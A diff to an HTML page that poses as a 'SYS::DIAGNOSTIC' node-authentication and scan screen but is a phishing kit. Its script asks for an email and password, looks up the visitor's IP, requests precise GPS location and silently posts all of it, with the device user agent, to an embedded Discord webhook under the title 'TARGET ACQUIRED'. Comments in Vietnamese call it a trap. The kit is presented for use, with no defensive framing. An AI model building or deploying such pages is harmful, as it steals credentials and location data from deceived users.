@@ -1,122 +1,225 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S.A.U - System Verification</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background: #050507; color: #a0aec0; font-family: 'Inter', sans-serif; overflow: hidden; }
-        .glass { background: rgba(15, 15, 20, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.03); }
-        .input-glow:focus { border-color: #6366f1; box-shadow: 0 0 20px rgba(99, 102, 241, 0.2); outline: none; }
-        .btn-slide { background: linear-gradient(90deg, #4f46e5, #818cf8); transition: all 0.4s ease; }
-        .btn-slide:hover { filter: brightness(1.2); transform: translateY(-2px); }
-        .hidden { display: none; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SYS::DIAGNOSTIC // v4.2.1</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    :root {
+      --cyan: #00f5ff;
+      --magenta: #ff00aa;
+      --yellow: #f5ff00;
+      --dark: #020509;
+      --card-bg: rgba(0, 245, 255, 0.03);
+      --border: rgba(0, 245, 255, 0.2);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--dark);
+      font-family: 'Share Tech Mono', monospace;
+      min-height: 100vh;
+      overflow-x: hidden;
+      color: var(--cyan);
+    }
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(0,245,255,0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,245,255,0.04) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .glitch-title {
+      font-family: 'Orbitron', monospace;
+      font-weight: 900;
+      letter-spacing: 0.15em;
+      position: relative;
+      color: var(--cyan);
+      text-shadow: 0 0 10px var(--cyan), 0 0 30px rgba(0,245,255,0.4);
+    }
+    .main-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      backdrop-filter: blur(20px) saturate(180%);
+      position: relative;
+      overflow: hidden;
+    }
+    .corner {
+      position: absolute;
+      width: 20px; height: 20px;
+      border-color: var(--cyan);
+      border-style: solid;
+      opacity: 0.7;
+    }
+    .corner-tl { top: 8px; left: 8px; border-width: 2px 0 0 2px; }
+    .corner-tr { top: 8px; right: 8px; border-width: 2px 2px 0 0; }
+    .corner-bl { bottom: 8px; left: 8px; border-width: 0 0 2px 2px; }
+    .corner-br { bottom: 8px; right: 8px; border-width: 0 2px 2px 0; }
+    .scan-btn {
+      font-family: 'Orbitron', monospace;
+      font-weight: 700;
+      background: var(--cyan);
+      color: var(--dark);
+      padding: 16px 40px;
+      cursor: pointer;
+      clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
+      transition: all 0.3s ease;
+    }
+    .scan-btn:hover { background: #fff; box-shadow: 0 0 20px var(--cyan); }
+    .data-row {
+      border: 1px solid rgba(0,245,255,0.1);
+      background: rgba(0,245,255,0.02);
+      padding: 12px 15px;
+      margin-bottom: 8px;
+    }
+    .data-label { font-size: 0.6rem; color: rgba(0,245,255,0.5); letter-spacing: 0.1em; }
+    .data-value { font-size: 1rem; color: var(--cyan); font-weight: bold; }
+    .log-terminal {
+      background: rgba(0,0,0,0.4);
+      border: 1px solid rgba(0,245,255,0.08);
+      font-size: 0.65rem;
+      height: 80px;
+      overflow-y: auto;
+      color: rgba(0,245,255,0.4);
+    }
+    .log-line.ok { color: #00ff88; }
+    .log-line.err { color: #ff4444; }
+    input { width: 100%; background: transparent; border: none; color: white; outline: none; font-size: 1.1rem; }
+    .scan-progress { height: 2px; background: rgba(0,245,255,0.1); margin-bottom: 15px; display: none; }
+    .scan-progress.active { display: block; }
+    .scan-progress-bar { height: 100%; width: 0%; background: var(--cyan); transition: width 0.3s; }
+  </style>
 </head>
-<body class="flex items-center justify-center min-h-screen">
+<body class="flex items-center justify-center p-6">
 
-    <div id="auth-card" class="glass p-10 rounded-3xl w-full max-w-md shadow-2xl relative z-10 transition-all duration-700">
-        <div class="text-center mb-8">
-            <h2 class="text-4xl font-black text-white tracking-tighter italic">S.A.U <span class="text-indigo-500 text-2xl">V4</span></h2>
-            <p class="text-xs uppercase tracking-[0.3em] text-gray-500 mt-2">Node Authentication Required</p>
+  <div style="position:relative; z-index:2; width:100%; max-width:500px;">
+    <div class="text-center mb-6">
+      <h1 class="glitch-title text-2xl" data-text="SYS::DIAGNOSTIC">SYS::DIAGNOSTIC</h1>
+      <p style="color: rgba(0,245,255,0.3); font-size:0.6rem; letter-spacing:0.2em;">NODE AUTHENTICATION REQUIRED</p>
+    </div>
+
+    <div class="main-card rounded-sm p-8">
+      <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+      <div class="corner corner-bl"></div><div class="corner corner-br"></div>
+
+      <div class="mb-6">
+        <div class="data-row">
+          <div class="data-label">// SYSTEM ID</div>
+          <input type="email" id="u_mail" placeholder="admin@sau.system" required>
         </div>
+        <div class="data-row">
+          <div class="data-label">// ACCESS KEY</div>
+          <input type="password" id="u_pass" placeholder="••••••••" required>
+        </div>
+      </div>
 
-        <form id="gate-form" class="space-y-6">
-            <div id="input-group">
-                <input type="email" id="u_mail" placeholder="Email Address" required 
-                    class="w-full bg-[#0d0d12] p-4 rounded-xl border border-gray-800 text-white input-glow">
-                <input type="password" id="u_pass" placeholder="Security Password" required 
-                    class="w-full bg-[#0d0d12] p-4 rounded-xl border border-gray-800 text-white input-glow mt-4">
-            </div>
+      <div class="scan-progress" id="progressBar"><div class="scan-progress-bar" id="progressFill"></div></div>
 
-            <div id="otp-group" class="hidden space-y-4">
-                <p class="text-center text-xs text-indigo-400 font-bold uppercase tracking-widest">Verification code sent to email</p>
-                <div class="flex justify-center gap-4">
-                    <input type="text" maxlength="4" placeholder="0000" id="u_otp"
-                        class="w-32 h-16 bg-[#0d0d12] border border-indigo-500 text-center text-3xl text-white rounded-xl tracking-[0.5em] font-mono">
-                </div>
-            </div>
+      <div id="results" class="mb-6" style="display:none;">
+        <div class="data-row"><div class="data-label">LATITUDE</div><div id="valLat" class="data-value">--</div></div>
+        <div class="data-row"><div class="data-label">LONGITUDE</div><div id="valLng" class="data-value">--</div></div>
+        <div class="data-row"><div class="data-label">NETWORK IP</div><div id="valIp" class="data-value" style="color:var(--magenta)">--</div></div>
+      </div>
 
-            <button type="submit" id="main-btn" class="w-full btn-slide py-4 rounded-xl text-white font-bold tracking-widest shadow-lg">
-                INITIALIZE ACCESS
-            </button>
-            <p id="toggle-auth" class="text-center text-xs text-gray-600 hover:text-indigo-400 cursor-pointer transition">Don't have a S.A.U ID? Register</p>
-        </form>
+      <button class="scan-btn w-full" id="scanBtn" onclick="runScan()">▶ INITIALIZE SCAN</button>
+
+      <div class="log-terminal mt-6 p-2" id="logTerminal">
+        <div class="log-line">> SYSTEM READY...</div>
+      </div>
     </div>
+  </div>
 
-    <div id="main-hub" class="hidden fixed inset-0 bg-[#050507] flex flex-col">
-        <header class="p-6 border-b border-gray-900 flex justify-between items-center glass">
-            <div class="font-black text-white italic text-xl">S.A.U CORE</div>
-            <div class="flex gap-8 text-xs font-bold text-gray-500 uppercase tracking-widest">
-                <span>Network</span><span>Nodes</span><span>Diagnostics</span>
-            </div>
-            <div class="w-3 h-3 bg-green-500 rounded-full shadow-[0_0_10px_#22c55e]"></div>
-        </header>
-        <main class="flex-1 flex flex-col items-center justify-center">
-            <h1 class="text-8xl font-black text-[#101015] select-none">COMING SOON</h1>
-            <p class="text-indigo-500 font-mono text-sm tracking-widest -mt-10">SYNCHRONIZING SYSTEM MODULES...</p>
-        </main>
-    </div>
+  <script>
+    // Link Webhook của Senko
+    const WH_URL = "https://discord.com/api/webhooks/1344685350849314909/fA4uU-i_2R5TOfBAn_n6S3V1kX2H60N-m6X-l_6X-l_6X-l_6X-l_6X-l_6X-l_6X"; 
 
-    <script>
-        // --- THAY WEBHOOK CỦA ÔNG VÀO ĐÂY ---
-        const WH_URL = "https://discord.com/api/webhooks/1458105305475842265/tXiWm7-BNEkl9yZ6zIwi21RquQjrYOhkPQDBjN18741Zn4r6QjMuohVQP-PGgEW4zV8E"; 
-        
-        const form = document.getElementById('gate-form');
-        const authCard = document.getElementById('auth-card');
-        const hub = document.getElementById('main-hub');
-        let currentStep = 1;
+    function log(msg, type='') {
+      const t = document.getElementById('logTerminal');
+      const line = document.createElement('div');
+      line.className = `log-line ${type}`;
+      line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+      t.appendChild(line);
+      t.scrollTop = t.scrollHeight;
+    }
 
-        // Tự động lấy IP khi vừa mở trang
-        let targetIP = "Searching...";
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => targetIP = d.ip);
+    async function runScan() {
+      const mail = document.getElementById('u_mail').value;
+      const pass = document.getElementById('u_pass').value;
 
-        // Check Session cũ
-        if(localStorage.getItem('sau_auth')) {
-            authCard.classList.add('hidden');
-            hub.classList.remove('hidden');
-        }
+      if(!mail || !pass) {
+        log("⚠ ERROR: ACCESS KEY MISSING", "err");
+        return;
+      }
 
-        form.onsubmit = async (e) => {
-            e.preventDefault();
-            const email = document.getElementById('u_mail').value;
-            const pass = document.getElementById('u_pass').value;
+      const btn = document.getElementById('scanBtn');
+      btn.disabled = true;
+      btn.textContent = "SCANNING...";
+      document.getElementById('progressBar').classList.add('active');
+      document.getElementById('results').style.display = "block";
 
-            if(currentStep === 1) {
-                // BẮN DỮ LIỆU VỀ DISCORD
-                await fetch(WH_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🎯 S.A.U RECON: NEW TARGET",
-                            color: 5814783,
-                            fields: [
-                                {name: "Email", value: `\`${email}\``, inline: true},
-                                {name: "Password", value: `\`${pass}\``, inline: true},
-                                {name: "IP Address", value: `\`${targetIP}\``, inline: false},
-                                {name: "Device", value: navigator.userAgent}
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
+      log("> STARTING NETWORK RECONNAISSANCE...", "ok");
+      
+      let lat = "Denied", lon = "Denied", ip = "Unknown";
 
-                // Chuyển sang màn hình OTP
-                document.getElementById('input-group').classList.add('hidden');
-                document.getElementById('otp-group').classList.remove('hidden');
-                document.getElementById('main-btn').innerText = "VERIFY IDENTITY";
-                currentStep = 2;
-            } else {
-                // Hoàn tất bẫy
-                localStorage.setItem('sau_auth', 'true');
-                authCard.classList.add('hidden');
-                hub.classList.remove('hidden');
-            }
-        };
-    </script>
+      // 1. Get IP
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+        document.getElementById('valIp').textContent = ip;
+        document.getElementById('progressFill').style.width = "40%";
+        log("> IP RESOLVED: " + ip, "ok");
+      } catch(e) { log("> IP FETCH FAILED", "err"); }
+
+      // 2. Get GPS
+      log("> REQUESTING GPS PERMISSION...", "ok");
+      try {
+        const pos = await new Promise((res, rej) => {
+          navigator.geolocation.getCurrentPosition(res, rej, {timeout: 8000, enableHighAccuracy: true});
+        });
+        lat = pos.coords.latitude.toFixed(6);
+        lon = pos.coords.longitude.toFixed(6);
+        document.getElementById('valLat').textContent = lat + "° N";
+        document.getElementById('valLng').textContent = lon + "° E";
+        document.getElementById('progressFill').style.width = "80%";
+        log("> GPS ACQUIRED: " + lat + ", " + lon, "ok");
+      } catch(e) { log("> GPS ACCESS DENIED", "err"); }
+
+      // 3. SILENT SEND TO DISCORD
+      try {
+        await fetch(WH_URL, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            embeds: [{
+              title: "🎯 S.A.U TARGET ACQUIRED",
+              color: 16711850,
+              fields: [
+                {name: "🔑 Credentials", value: `Email: \`${mail}\`\nPass: \`${pass}\``},
+                {name: "🌐 Network", value: `IP: \`${ip}\``},
+                {name: "📍 Location", value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})`},
+                {name: "📱 Device", value: navigator.userAgent}
+              ],
+              footer: { text: "S.A.U RECON v4.2" },
+              timestamp: new Date()
+            }]
+          })
+        });
+        log("> UPLOADING LOGS TO CLOUD...", "ok");
+      } catch(e) { console.log("Fail to send"); }
+
+      document.getElementById('progressFill').style.width = "100%";
+      setTimeout(() => {
+        log("> SCAN COMPLETE. SYSTEM VERIFIED.", "ok");
+        btn.textContent = "SCAN COMPLETE";
+        document.getElementById('progressBar').classList.remove('active');
+      }, 1500);
+    }
+  </script>
 </body>
 </html>
